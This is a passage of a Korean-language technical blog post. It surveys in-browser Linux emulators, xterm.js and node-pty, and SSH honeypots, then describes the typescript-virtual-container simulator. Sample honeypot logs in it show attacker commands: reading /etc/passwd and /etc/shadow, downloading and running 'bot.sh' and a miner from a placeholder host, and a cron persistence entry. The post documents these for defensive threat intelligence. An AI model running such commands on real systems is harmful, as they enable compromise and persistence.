결과 `.wasm`은 크다 -- 최소 Ubuntu는 수백 MB -- 하지만 완전히 자급자족해. 누군가에게 `.wasm`을 이메일로 보내면 그들이 브라우저에서 Ubuntu를 실행할 수 있어. 그 문장은 말이 안 되야 하지만, 여기까지 왔어.

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### 에뮬레이터 계열 요약

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **아키텍처** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (독점) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **실제 커널** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64비트** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **npm 패키지** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (CLI 도구) |
| **Node.js 사용** | ✅ | ❌ | ❌ | ❌ | ❌ (브라우저 전용) | Wasmtime으로 |
| **브라우저 사용** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/인스턴스** | 150–256 MB | ~64–128 MB | ~64 MB | 200+ MB | ~100 MB | ~200–500 MB |
| **부팅 시간** | 15–40초 | 10–30초 | 10–30초 | 15–40초 | 2–5초 | 10–40초 |
| **오픈 소스** | ✅ | ✅ | ✅ | ❌ | 부분적 | ✅ |
| **상태** | ✅ 매우 활동적 | ✅ 안정 | ⚠️ 보관됨 | ✅ 상용 | ✅ 활동적 | ✅ 활동적 |

이 표에서 눈에 띄는 점: `v86`은 npm 패키지이면서 브라우저와 Node 모두에서 실행되고 오픈 소스인 유일한 거야. 그래서 "JavaScript Linux 에뮬레이터" 대화를 지배하는 거지. 다른 것들은 각자 제약이 있어 -- JSLinux는 API가 없고, jor1k는 보관됐고, CheerpX는 돈이 들고, WebContainers는 브라우저 전용이고 Node 전용이며, container2wasm은 빌드 단계와 CLI가 필요해. 그냥 "JavaScript로 Linux 부팅"이 필요하면, `v86`이 거의 항상 올바른 출발점이야.

---

## 파트 3 -- 터미널 스택: xterm.js와 node-pty

셸 같은 경험을 만들 때 두 패키지가 계속 등장해. 샌드박스나 에뮬레이터가 아니라 -- UI와 PTY 배관이야 -- 하지만 너무 인접해서 빼면 섭섭할 것 같아. 그리고 둘 다 써봤는데 정말 좋아.

### 3.1 `xterm.js` -- 터미널 렌더러

xterm.js는 브라우저용 터미널 에뮬레이터야. `<canvas>` 요소에 터미널 화면(VT100/xterm 이스케이프 시퀀스)을 렌더링하고, 키보드 입력을 처리하며, 데이터를 주고받기 위한 API를 노출해.

사용처: VS Code의 통합 터미널, Azure Cloud Shell, Proxmox VE, AWS CloudShell 등.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// 터미널에 데이터 전송 (텍스트로 렌더링됨)
term.write("$ ");
term.onData(data => {
  // data는 키스트로크 -- 백엔드로 전송
  socket.send(data);
});
socket.onmessage(msg => {
  // 백엔드의 출력 -- 표시
  term.write(msg.data);
});
```

xterm.js는 렌더링 레이어일 뿐이야. 셸을 실행하지 않아. 명령을 해석하지 않아. 원하는 백엔드에 연결하는 디스플레이 위젯이야. 많은 사람들이 xterm.js가 "터미널을 처리한다"고 생각하지만, 실제로는 화면만 담당해 -- 명령을 실제로 실행하는 무언가에 연결해야 해.

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- PTY 생성

`node-pty`는 Node.js에서 의사 터미널(PTY)을 생성하고 읽기/쓰기 핸들을 제공해. xterm.js와 함께 사용하면, 서버에서 실행 중인 실제 셸(bash, zsh, fish)과 대화하는 브라우저 터미널을 만들 수 있어.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // WebSocket을 통해 브라우저 xterm.js로 전송
  ws.send(data);
});

ws.on("message", data => {
  // 브라우저 키스트로크를 셸로 전달
  shell.write(data);
});
```

이게 클라우드 IDE와 웹 터미널의 표준 패턴이야: xterm.js (브라우저) ↔ WebSocket ↔ node-pty ↔ 실제 bash. 격리 없음. 셸은 Node.js 프로세스의 전체 권한(또는 실행하는 사용자의 권한)으로 실행돼.

**유지보수**: Microsoft.
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)
**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## 파트 4 -- SSH 허니팟

허니팟은 공격받도록 설계됐어. 목표는 공격자가 상호작용할 만큼 실제처럼 보이면서, 그들이 하는 모든 것을 위협 인텔리전스용으로 기록하는 거야. SSH가 주요 대상이야 -- 인터넷에서 가장 많이 공격받는 서비스니까. 공용 IP에서 22번 포트를 열면 말 그대로 몇 분 안에 자동화된 스캐닝 시도를 볼 거야. 한번 해봐, 얼마나 빨리 일어나는지 소름 끼칠 거야.

허니팟의 품질은 두 가지로 측정돼: **충실도**(얼마나 설득력 있게 실제 시스템인 척하는지)와 **원격 측정**(얼마나 많은 유용한 데이터를 캡처하는지). 이 둘은 상충 관계야. 충실도가 높은 허니팟은 만들기 더 어렵고 운영하기 더 위험해.

이 섹션이 결국 `typescript-virtual-container`에 `HoneyPot` 모듈을 만들게 한 계기라서, 여기에 몇 가지 의견이 있어.

### 4.1 Cowrie -- 황금 표준

Cowrie는 Python 기반의 중간-높은 상호작용 SSH 및 Telnet 허니팟이야. 연구 및 보안 커뮤니티에서 가장 널리 배포된 SSH 허니팟이야.

아키텍처:
- **프로토콜 레이어**: 실제 SSH 프로토콜 구현 (Twisted Conch), 그래서 공격자는 실제 핸드셰이크, 실제 키 교환, 실제 인증을 경험
- **셸 레이어**: 가짜 파일시스템 (Debian 5.0 유사)과 일반적인 명령에 응답하는 부분적인 셸 인터프리터
- **프록시 모드**: 뒤에 있는 실제 시스템으로 전달 가능 (높은 상호작용 모드), 통과하는 모든 것을 기록
- **LLM 모드** (최근 추가): 처리 방법을 모르는 명령에 동적 응답을 생성하기 위해 언어 모델 사용 -- 네, Cowrie에 이제 AI 모드가 있어. 정신없는 시대야.

```python
# Cowrie가 캡처하는 것
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie는 다운로드된 파일(wget/curl/SFTP/SCP 통해)을 악성코드 분석용으로 저장해. Splunk, Elasticsearch 및 기타 SIEM 플랫폼과 통합돼.

**충실도**: 중간-높음. 자동화된 봇을 속이기에 충분히 설득력 있음 (SSH 공격자의 99%는 -- 대부분은 그냥 `root`/`password`를 시도하는 멍청한 스크립트야). 정교한 인간은 지문을 찾을 수 있지만, 보통 꽤 빠르게.

**언어**: Python (Twisted)
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo -- Cowrie의 전신

Kippo는 Cowrie의 기반이 된 원래 중간 상호작용 SSH 허니팟이야. 같은 기본 아이디어: 실제 SSH 프로토콜, 가짜 파일시스템, 부분적 셸. Cowrie가 지금은 완전히 대체했어 -- Kippo는 보관됐고 2026년에 아무도 실행하면 안 돼. 역사적 완전성을 위해 여기서 언급할 뿐, 오래된 블로그 글과 보안 논문에서 참조되는 걸 볼 수 있으니까.

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo) -- 보관됨

---

### 4.3 endlessh -- SSH 타르핏

endlessh는 변태 허니팟이야: 배너 데이터를 초당 1바이트(또는 더 느리게)로 천천히 흘려보내 SSH 연결을 열린 상태로 유지해. 연결하는 SSH 클라이언트는 무기한 대기하게 돼 -- 서버가 배너 전송을 끝내지 못해서 인증 단계에 절대 도달하지 못해.

목표는 위협 인텔리전스가 아니라 순수한 자원 거부야: 공격자 스캐너 스레드를 묶어서 실제 대상을 빠르게 공격하지 못하게 하는 거야. 가장 좋은 방법으로 사악하다고 생각해. 공격자로부터 아무것도 배우는 게 아니라 -- 그냥 시간을 낭비하는 거야. 거기에 깊은 만족감이 있어.

```c
// endlessh의 전체 프로토콜 동작:
// 전송: "SSH-2.0-OpenSSH_" 그 다음 천천히 랜덤 문자 추가
// 연결을 절대 닫지 않음
// 공격자 스캐너는 N초 후 타임아웃
```

명령이 캡처되지 않아. 인증이 테스트되지 않아. 그냥 연결 시간만.

**작성 언어**: C
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame -- "모두 들여보내" 허니팟

sshesame는 모든 SSH 연결을 수락하고 (모든 사용자 이름, 모든 비밀번호, 모든 키) 모든 것을 기록해. 제로 상호작용 허니팟이야: 명령에 응답하지 않고, 공격자를 "들여보내고" 그들이 입력하는 모든 키스트로크를 기록해.

```
2024-01-15 03:22:11 45.33.32.156에서 연결
  사용자 이름: root, 비밀번호: password123 -- 수락됨
  입력된 명령:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  47초 후 연결 종료
```

자격 증명 수집에 유용해: 봇이 시도하는 사용자 이름과 비밀번호를 빠르게 축적해서 현재 어떤 기본 자격 증명이 무차별 대입되고 있는지 알려줘. 스포일러: 항상 `root`/`password`, `admin`/`admin`, `root`/`123456`이야. 매번.

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird -- Docker 기반 허니팟 프레임워크

`lyrebird/honeypot-base`는 네트워크 서비스 허니팟 구축을 위한 Docker 베이스 이미지야. 구체적으로 SSH 허니팟이 아니라 -- 모든 프로토콜 허니팟 구축을 위한 프레임워크야.

베이스 이미지는 로깅 프레임워크, 프로토콜용 플러그인 시스템, 다중 서비스 허니팟용 Docker Compose 설정을 제공해. 특정 서비스를 가짜로 만들기 위해 확장해.

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Node.js에서 SSH 허니팟 구축 -- 순진한 방식, 그리고 실패하는 이유

`typescript-virtual-container` 이전에, Node.js에서 SSH 허니팟을 구축하는 것은 실제 `ssh2` 라이브러리와 수동 명령 가짜 구현을 결합하는 것을 의미했어. 매우 지루하고, 매우 불완전하지만, 이쯤에서 통과 의례 같은 거야:

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // 시도 기록
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // 모두 들여보내
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // 가짜 응답
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

이것은 자격 증명과 명령을 캡처한다는 의미에서 "작동"해. 하지만 정교한 공격자가 찔러보는 순간 분명히 가짜야. `uname -a`가 올바른 문자열을 반환하지만 `ls /etc`가 "command not found"를 반환하는 건 바로 드러나. 파일시스템이 존재하지 않아. 명령이 체인되지 않아. 파이프가 작동하지 않아. 변수가 확장되지 않아.

숙련된 공격자는 처음 다섯 개의 명령 안에 허니팟을 식별할 거야. Cowrie 같은 동작을 확인하는 자동화된 스크립트도 즉시 감지할 거야. 이것이 `typescript-virtual-container` 작성자가 명령을 실제로 해석하는 무언가를 만들게 된 동기인 것 같아 -- 파트 5에서 더 자세히.

---

### 허니팟 계열 요약

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | 순진한 ssh2 |
|---|---|---|---|---|---|---|
| **상호작용 수준** | 중간-높음 | 중간 | 제로 | 제로 | 다양 | 낮음 |
| **실제 SSH 프로토콜** | ✅ | ✅ | ❌ (타르핏) | ✅ | 다양 | ✅ |
| **셸 충실도** | 중간 | 중간 | n/a | 없음 | 다양 | 최소 |
| **자격 증명 캡처** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **명령 캡처** | ✅ | ✅ | ❌ | ✅ | 다양 | ✅ |
| **악성코드 캡처** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **SIEM 통합** | ✅ 네이티브 | ❌ | ❌ | ❌ | ❌ | 수동 |
| **LLM 응답** | ✅ (신규) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **언어** | Python | Python | C | Go | Docker | Node.js |
| **Node.js 네이티브** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **상태** | ✅ 매우 활동적 | ⚠️ 보관됨 | ✅ 활동적 | ✅ 활동적 | ✅ 활동적 | DIY |

여기서 패턴은 꽤 명확해: 더 많은 충실도를 원할수록, 더 많은 Python을 작성해야 해. Cowrie가 진지하게 한다면 확실한 승자야 -- 수년간 전투 테스트를 거쳤고 자격 증명 이상의 것을 캡처해. endlessh와 sshesame은 진지한 위협 인텔 도구보다는 재미있는 사이드 프로젝트에 가까워. 그리고 순진한 Node.js 접근 방식은 벽에 부딪히기 전에 20% 정도밖에 못 가.

---

## 파트 5 -- `typescript-virtual-container`: 무엇이 간극을 채우는가

자, 여기부터 흥미로워져. 위의 모든 계열을 정리한 후, 빠진 사분면이 분명해져:

- JS 샌드박스: 코드 격리, 셸 없음, 파일시스템 없음, SSH 없음
- Linux 에뮬레이터: 실제 OS, 실제 셸, 실제 SSH... 하지만 150+ MB RAM, 30초 부팅, 시리얼 I/O 위에 자체 API를 구축해야 함
- 허니팟: 가짜 셸, 프로그래밍 API 없음, Python/Go/C, Node 네이티브 아님

아무도 완전하고, 프로그래밍 가능하며, Node 네이티브인 실제 SSH, 실제 권한, 실제 가상 네트워킹, 타입 있는 TypeScript API를 가진 Linux 환경을 만들지 않았어. 그래서 그녀가 만들었지.

간단한 소개 -- 이 글에서 처음으로 제대로 언급하니까: `typescript-virtual-container`는 **Chloé Rolzhausen**이 만들었어. 프랑스 개발자로, 온라인에서는 **Fortune**(또는 ItsRealFortune)으로 알려져 있어. 그녀의 [웹사이트](https://itsrealfortune.fr)와 [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/)에서 찾을 수 있어. 전체 프로젝트 -- 56,000줄의 TypeScript, 247개 파일, 170개 명령 -- 은 한 사람의 단독 작업이었어. 이 글의 나머지에서는 Fortune이라고 부를게. 그리고 맞아, 꽤 정신없어. 그녀의 작업을 확인해 봐!

### 실제로 무엇인가

`typescript-virtual-container`는 순수 TypeScript로 작성된 **Linux 환경 시뮬레이터**야. Wasm 없음. 네이티브 애드온 없음. 커널 없음. 247개 TypeScript 파일에 약 56,000줄의 소스 코드.

핵심 통찰력: `ls /etc | grep passwd`가 작동하게 하는 데 CPU 에뮬레이터가 필요하지 않아. 필요한 건:
1. 경로 연산에 응답하는 메모리 내 노드 트리
2. 모든 접근에 적용되는 POSIX 권한 모델
3. 파이프라인, 리디렉션, 서브셸, 변수 확장을 이해하는 셸 파서
4. ~170개의 명령 구현 (함수, 바이너리가 아님)
5. 사용자 및 그룹 관리 시스템
6. 이 모든 것을 SSH로 노출하는 것

이 모든 것은 커널 개입 없이 순수 TypeScript로 달성 가능해.

### VirtualFileSystem

VFS는 타입이 있는 노드의 메모리 내 트리야 -- 명시적으로 `"fs"` 영속성 모드를 활성화하지 않는 한 디스크 I/O가 없어:

```ts
// 간소화된 내부 표현
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // 지연 로드된 플레이스홀더
```

모든 경로 연산은 `normalizePath` (`.`, `..`, 심링크 해석)과 `enforceAccess` (요청 uid/gid에 대한 읽기/쓰기/실행 권한 확인)을 통과해. `chmod`, `chown`, 스티키 비트, setuid가 모두 구현되어 있고 실제로 적용돼. uid 1000으로 실행되는 프로세스가 root 소유의 mode 0600 파일을 읽으려고 하면, EACCES를 받아 -- 가짜 EACCES가 아니라 권한 검사에서 던져진 실제 JavaScript `Error`. 그 부분은 꽤 우아해.

VFS는 다음으로 직렬화돼:
- `.vfsb` -- 컴팩트한 바이너리 형식 (커스텀, fflate 압축 사용) -- 이게 기본값
- JSON 스냅샷 -- 사람이 읽을 수 있음, 디버깅에 좋음
- TAR 아카이브 -- 실제 tar 형식으로 가져오기/내보내기 가능, 그래서 `tar -xf` 하면 VFS에... 그 파일들이 생겨
- SquashFS 이미지 -- 읽기 전용 가져오기

`"fs"` 영속성 모드에서는 충돌 복구를 위한 write-ahead journal (WAL)을 유지해 -- 쓰기는 먼저 저널로 간 다음, 플러시 시 스냅샷으로 감. Node가 작업 중에 충돌하면, 저널이 마지막 완전한 상태를 재구성할 수 있게 해.

디스크 I/O 지연 시간을 시뮬레이션하는 `FileCache` 레이어도 있어. `NVME_DISK_IO`나 `HDD_DISK_IO` 같은 프로필을 구성하면 VFS가 현실적인 타이밍과 일치하도록 파일 연산을 인위적으로 지연시켜. 소프트웨어가 의도적으로 느려져서 하드웨어를 시뮬레이션하는 게 좀 웃기긴 하지만 -- 벤치마킹에 매우 유용해.

### 셸 인터프리터

셸 파서는 타입이 있는 AST를 생성해:

```ts
// "ls /etc | grep root && echo done"은 이렇게 파싱됨:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

실행기가 이 AST를 따라가:
- 파이프라인의 경우, `{ stdin, stdout, stderr }` 스트림 체인을 만들고 각 명령을 파이프된 I/O로 실행
- 논리 연산자(`&&`, `||`)의 경우, 왼쪽 실행 후 `$?`를 확인한 다음 오른쪽 실행
- 서브셸(`$(...)`, `` ` ` ``)의 경우, 실행 컨텍스트를 포크
- 리디렉션(`>file`, `>>file`, `2>&1`, `<file`)의 경우, 실행 전 스트림 배선 설정
- 백그라운드 작업(`cmd &`)의 경우, 완료를 기다리지 않고 실행
- 변수의 경우, `$VAR`, `${VAR:-default}`, `${#VAR}`, 산술 `$((expr))` 확장
- 중괄호 확장(`{a,b,c}`, `{1..5}`)의 경우, 실행 전 전체 확장 목록 생성

이 모든 것은 실제 POSIX 셸 동작이야. 파서는 히어독, 프로세스 치환, 글롭(`*`, `?`, `[abc]`), 따옴표 처리(작은따옴표, 보간이 있는 큰따옴표, 백슬래시 이스케이프)를 처리해. 완벽하지는 않아 -- 엣지 케이스가 존재해 -- 하지만 TypeScript 프로젝트에서 기대하는 것보다 훨씬 뛰어나.

### ~170개의 내장 명령

명령은 명령 레지스트리에 등록된 TypeScript 함수야. stdin/stdout/stderr 스트림, VFS, 사용자 세션, 셸 환경, 서브모듈에 대한 접근 권한이 있는 `CommandContext`를 받아.

170개의 Unix 명령 구현을 작성하는 건... 정말 많은 일이야. 일부는 간단하고(`echo`, `true`, `false`), 일부는 놀라울 정도로 복잡해(`awk`, `find`, `tar`). 완전한 POSIX `awk`를 TypeScript로? 그건 진짜 정신없어. 다음은 그중 일부 샘플이야:

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (클라이언트 측, 외부 연결),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (스텁), python3 (스텁), node (스텁),
nano (전체 대화형 편집기), vim (기본), vi (기본),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (시뮬레이션), systemctl (스텁), journalctl (스텁),
...그 외 ~130개 더
```

"스텁"(git, python3, node)은 일반적인 호출에 현실적으로 응답해 -- `python3 --version`은 그럴듯한 버전 문자열을 반환하고, `git status`는 가짜 저장소 상태를 보여줘 -- 실제 작업을 수행하지 않고. 허니팟의 경우, 실제보다 더 유용해. 공격자가 실행하려는 것을 관찰할 수 있으면서 아무것도 실행하지 않기 때문이야.

### SSH 서버

SSH 레이어는 실제 `ssh2` npm 패키지를 사용해 -- 실제 SSH 프로토콜, 실제 키 교환, 실제 암호화. `SSHMimic`이それを 감싸:

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// 실제 SSH: ssh -p 2222 root@localhost
// 실제 SFTP: sftp -P 2222 root@localhost
// 실제 SCP: scp -P 2222 file root@localhost:/tmp/
```

`shellProperties`는 `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version`, `/etc/os-release`가 보고하는 내용을 결정해. 어떤 Linux 배포판과 커널 버전이든 설득력 있게 사칭할 수 있어 -- 실제 SSH 클라이언트에게는 말 그대로 차이를 알 방법이 없어.

### HoneyPot 모듈

셸 인터프리터가 실제이고 SSH 서버가 실제이기 때문에, 공격자의 명령이 가상 환경에서 실제로 실행돼. 공격자가 트리거한 `wget` 요청은 대상 URL과 함께 기록돼. 공격자가 만든 파일은 VFS에 저장돼. 공격자의 권한 상승 시도는 현실적인 오류를 생성해.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// 세션 후, 파일시스템 차이 비교
const before = shell.vfs.toSnapshot();
// ... 공격자 세션 ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

이것은 질적으로 Cowrie와 달라. Cowrie의 가짜 파일시스템은 `ls`에 응답할 수 있지만, 공격자가 어떤 파일을 만들었고 무엇을 변경했는지 구조화된 diff로 추적할 수 없어. `typescript-virtual-container`는 가능해. VFS가 라이브 데이터 구조이기 때문이야 -- 모든 쓰기가 추적돼. 공격자가 방금 추가한 cron 항목? diff에 있어. 그 `.hidden` 폴더? diff에 있어. 악성코드 분석에 꽤 유용해.

### 가상 네트워크 스택

이게 아마 전체 프로젝트에서 가장 인상적인 부분일 거야. 이 공간의 다른 어떤 프로젝트와도 비교할 수 없어. VPN 지원이 있는 완전한 L2/L3 가상 네트워크 스택이 순수 TypeScript로, 실제 네트워크 어댑터 없이 작성됐어. 진짜 정신없어.

`VirtualNetworkManager`는 각 `VirtualShell` 인스턴스에 설정 가능한 IP 주소, 라우팅 테이블, 소프트웨어 방화벽(conntrack 및 NAT가 있는 iptables 스타일 규칙)이 있는 가상 네트워크 인터페이스를 제공해. `ip addr`, `ip route`, `iptables -L`, `netstat -rn` 모두 가상 네트워크 상태를 보여줘.

`VirtualSwitch` (Baie라고 이름 붙여짐 -- 프랑스어로 서버 랙 베이를 뜻하는 "baie informatique"에서 유래)는 공유 서브넷에서 여러 셸을 연결해. 다음을 구현해:
- MAC 학습과 ARP
- 서브넷 간 IP 라우팅
- NAT (아웃바운드 masquerade)
- DNS (서브넷별 설정 가능한 레코드)
- 부하 분산 (라운드로빈, 최소 연결)
- 트래픽 셰이핑: 지연 시간, 지터 (가우스 분포), 패킷 손실, 버스트 손실, 재정렬, 중복
- 대역폭 제한 (토큰 버킷)
- MTU 시행
- 연결 추적 (상태 저장, NEW/ESTABLISHED/TIME_WAIT 상태 포함)

```ts
const baie = new Baie("192.168.0.0/24");

// 같은 스위치에 세 개의 가상 머신
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// 방화벽: web은 api에 도달 가능, api는 db에 도달 가능, web은 db에 직접 도달 불가
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// 트래픽 셰이핑: 외부로의 불안정한 WAN 링크 시뮬레이션
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn`은 Baie 인스턴스 사이에 암호화된 터널을 생성해 -- 사이트 간 VPN 상호 연결로 다중 사이트 네트워크를 시뮬레이션할 수 있어.

`VirtualProxy`는 포트 포워딩과 SOCKS5 프록시를 구현해.

이 중 어느 것도 실제 네트워크 어댑터를 건드리지 않아. 모두 TypeScript 객체 라우팅이야. `ping` 명령은 가상 스위치를 통해 라우팅되고 시뮬레이션된 ICMP 응답을 반환함으로써 "작동"해. `curl http://192.168.0.3/api`는 가상 네트워크를 통해 라우팅되고, api 셸의 시뮬레이션된 HTTP 응답에 도달하며, 콘텐츠를 반환해. 가장 좋은 방법으로, 끝까지 거북이야.

### SandboxedShell

더 강력한 격리가 필요한 프로그래밍 방식 사용을 위해, `SandboxedShell`은 Node.js Worker 스레드에서 셸 세션을 실행해:

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 코어 하나의 25%
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

여기서 격리는 VFS 레이어(워커 스레드의 셸은 가상 파일시스템만 볼 수 있고 호스트 파일시스템은 절대 볼 수 없음)와 Node.js Worker 스레드 메모리 격리에 의해 강제돼. 이것은 `isolated-vm`보다 가볍지만 JS 수준 격리보다는 셸 수준 격리에 더 적합해.

### 리소스 제한

셸별 리소스 제한을 구성할 수 있고, 시스템 모니터링 명령이 보고하는 내용에 영향을 미쳐:

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

그 셸 내부에서 `free -m`은 총 512 MB RAM을 보여줘. `nproc`은 2를 반환해. `/proc/meminfo`는 제한된 값을 보여줘. `htop`과 `top`은 제한된 CPU 수를 보여줘. 이렇게 가짜 머신의 하드웨어 프로필을 정밀하게 지문 설정할 수 있어.

### 세 가지 배포 모드

```
모드 1: SSH/SFTP 서버
  VirtualSshServer / VirtualSftpServer
  → 실제 SSH 프로토콜, 실제 SFTP, 실제 SCP
  → 사용 사례: 허니팟, 원격 테스트 환경, 교육 연구실

모드 2: 웹 셸 (브라우저)
  builds/fortune-nyx-v1.7.6-web.min.js (ESM 번들)
  → 브라우저에서 실행, VFS가 IndexedDB에 영속화
  → 사용 사례: 대화형 튜토리얼, 내장 터미널, 데모
  → 보너스: startxfce4 실행으로 완전한 시뮬레이션된 XFCE 데스크톱

모드 3: 독립형 CLI
  builds/fortune-nyx-v1.7.6-directbash-k6.1.0.mjs (단일 파일, 설치 불필요)
  → curl로 실행, .vfs/ 디렉토리에 VFS 영속화
  → 사용 사례: 빠른 데모, 로컬 실험
```

### 폴리필 -- Wasm 없이 브라우저 빌드가 작동하는 방식

자, 이게 내가 진짜 영리하다고 생각하고 특히 강조하고 싶었던 부분이야.

Node.js 라이브러리를 브라우저에서 실행하게 만드는 건 보통 악몽이야. Wasm 런타임(무겁고, 로드 느림)을 사용하거나 모든 `node:*` import를 브라우저 호환 대안으로 수동으로 바꾸는 데 몇 주를 보내야 해. Fortune은 두 번째 방법을 선택했어 -- 하지만 매우 깔끔하게, 저장소의 `polyfills/` 디렉토리에 있는 커스텀 폴리필 세트를 작성함으로써.

빌드 파이프라인은 `alias` 항목 더미가 있는 esbuild일 뿐이야:

```js
// demo/build.js -- 전체 브라우저 빌드 설정
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
